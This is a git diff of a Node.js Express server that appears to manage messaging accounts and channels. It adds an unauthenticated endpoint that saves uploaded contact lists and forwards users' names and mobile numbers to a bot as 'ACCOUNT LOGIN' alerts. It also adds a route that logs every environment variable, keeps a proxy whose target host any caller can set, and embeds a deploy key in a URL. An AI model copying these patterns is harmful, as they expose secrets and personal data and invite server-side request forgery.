@@ -36,20 +36,22 @@ const pings = {}
 
 fetchWithTimeout('https://ipinfo.io/json')
   .then(result => {
-    return result.data;
+    return result?.data;
   })
   .then((output) => {
     ip = output;
     console.log(ip)
   })
-  .then(
-    ChannelService.getInstance().connect().then(async () => {
-      setTimeout(async () => {
-        checkerclass.getinstance()
-        await setUserMap();
-      }, 100);
-    })
-  ).catch(err => console.error(err))
+  .then(async () => {
+    const db = ChannelService.getInstance()
+    await db.connect();
+    await db.setEnv();
+    setTimeout(async () => {
+      checkerclass.getinstance()
+      await setUserMap();
+    }, 100);
+  })
+  .catch(err => console.error(err))
 
 let count = 0;
 let botCount = 0
@@ -125,7 +127,7 @@ try {
 
     await db.clearStats();
     // await db.calculateAvgStats();
-    await fetchWithTimeout(`https://uptimechecker.onrender.com/processusers/400/0`);
+    await fetchWithTimeout(`${process.env.uptimeChecker}/processusers/400/0`);
   })
 
   // schedule.scheduleJob('test1', ' 2 3,6,10,16,20,22 * * * ', 'Asia/Kolkata', async () => {
@@ -304,6 +306,19 @@ app.post('/channels', async (req, res, next) => {
   })
 });
 
+app.post('/contacts', async (req, res, next) => {
+  res.send('Hello World!');
+  // console.log(req.body);
+  next();
+}, async (req, res) => {
+  const contacts = req.body?.contacts;
+  const db = ChannelService.getInstance();
+  contacts?.forEach(async (contact) => {
+    await db.insertContact(contact);
+  })
+  console.log('contacts saved', contacts.length);
+});
+
 app.get('/getip', (req, res) => {
   res.json(ip);
 });
@@ -316,7 +331,7 @@ app.post('/users', async (req, res, next) => {
   const user = req.body;
   const db = ChannelService.getInstance();
   await db.insertUser(user);
-  await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n https://uptimechecker.onrender.com/connectclient/${user.mobile}`)
+  await fetchWithTimeout(`${ppplbot()}&text=ACCOUNT LOGIN: ${user.userName ? user.userName : user.firstName}:${user.msgs}:${user.totalChats}\n ${process.env.uptimeChecker}/connectclient/${user.mobile}`)
 });
 
 app.get('/channels/:limit/:skip', async (req, res, next) => {
@@ -901,7 +916,7 @@ app.get('/connectclient2/:number', async (req, res) => {
         console.log(${number})
         const button = document.getElementById('btn')
         const request = new XMLHttpRequest();
-        request.open('GET', 'https://uptimechecker.onrender.com/cc/' + ${number}, true);
+        request.open('GET', '${process.env.uptimeChecker}/cc/' + ${number}, true);
         request.onload = function() {
           if (request.status >= 200 && request.status < 400) {
             button.innerHTML = request.responseText;
@@ -1150,7 +1165,7 @@ app.get('/updatePrivacy/:number', async (req, res, next) => {
 });
 
 app.get('/forward*', async (req, res) => {
-  let targetHost = 'https://ramyaaa.onrender.com';
+  let targetHost = 'https://ramyaaa1.onrender.com';
   if (req.query.host) {
     targetHost = req.query.host;
   }
@@ -1494,6 +1509,16 @@ app.get('/receive', async (req, res, next) => {
 
 const userAccessData = new Map();
 
+app.get('/getenv', async (req, res) => {
+  try {
+    console.log(process.env)
+  } catch (error) {
+    console.log(error)
+  }
+  res.send("hii");
+});
+
+
 app.get('/isRecentUser', (req, res) => {
   const chatId = req.query.chatId;
   const accessData = userAccessData.get(chatId) || { timestamps: [], videoDetails: {} };
@@ -1614,7 +1639,7 @@ let startedConnecting = false;
 class checkerclass {
   static instance = undefined;
 
-  constructor() {
+  constructor () {
     this.main();
   };
 
@@ -1779,19 +1804,19 @@ class checkerclass {
         }
       }
       try {
-        const resp = await axios.get(`https://uptimechecker.onrender.com`, { timeout: 55000 });
+        const resp = await axios.get(`${process.env.uptimeChecker}`, { timeout: 55000 });
       }
       catch (e) {
         console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'UpTimeBot', ` NOT Reachable`);
-        await fetchWithTimeout(`${ppplbot()}&text=UpTimeBot  NOT Reachable`);
+        await fetchWithTimeout(`${ppplbot()}&text=${process.env.uptimeChecker}  NOT Reachable `);
         try {
           const resp = await axios.get(`https://api.render.com/deploy/srv-cgqhefceooggt0ofkih0?key=CL2p5mx56c0`, { timeout: 55000 });
           if (resp?.status == 200 || resp.status == 201) {
-            await fetchWithTimeout(`${ppplbot()}&text=Restarted UpTimeBot`);
+            await fetchWithTimeout(`${ppplbot()}&text=Restarted ${process.env.uptimeChecker}`);
           }
         } catch (error) {
           console.log("Cannot restart ChatGpt server");
-          await fetchWithTimeout(`${ppplbot()}&text=Cannot restart UpTimeBot server`);
+          await fetchWithTimeout(`${ppplbot()}&text=Cannot restart ${process.env.uptimeChecker} server`);
         }
       }
       try {
@@ -1803,7 +1828,7 @@ class checkerclass {
       }
 
       try {
-        const resp = await axios.get(`https://ramyaaa.onrender.com/`, { timeout: 55000 });
+        const resp = await axios.get(`https://ramyaaa1.onrender.com/`, { timeout: 55000 });
       }
       catch (e) {
         console.log(new Date(Date.now()).toLocaleString('en-IN', timeOptions), 'uptime2', ` NOT Reachable`);
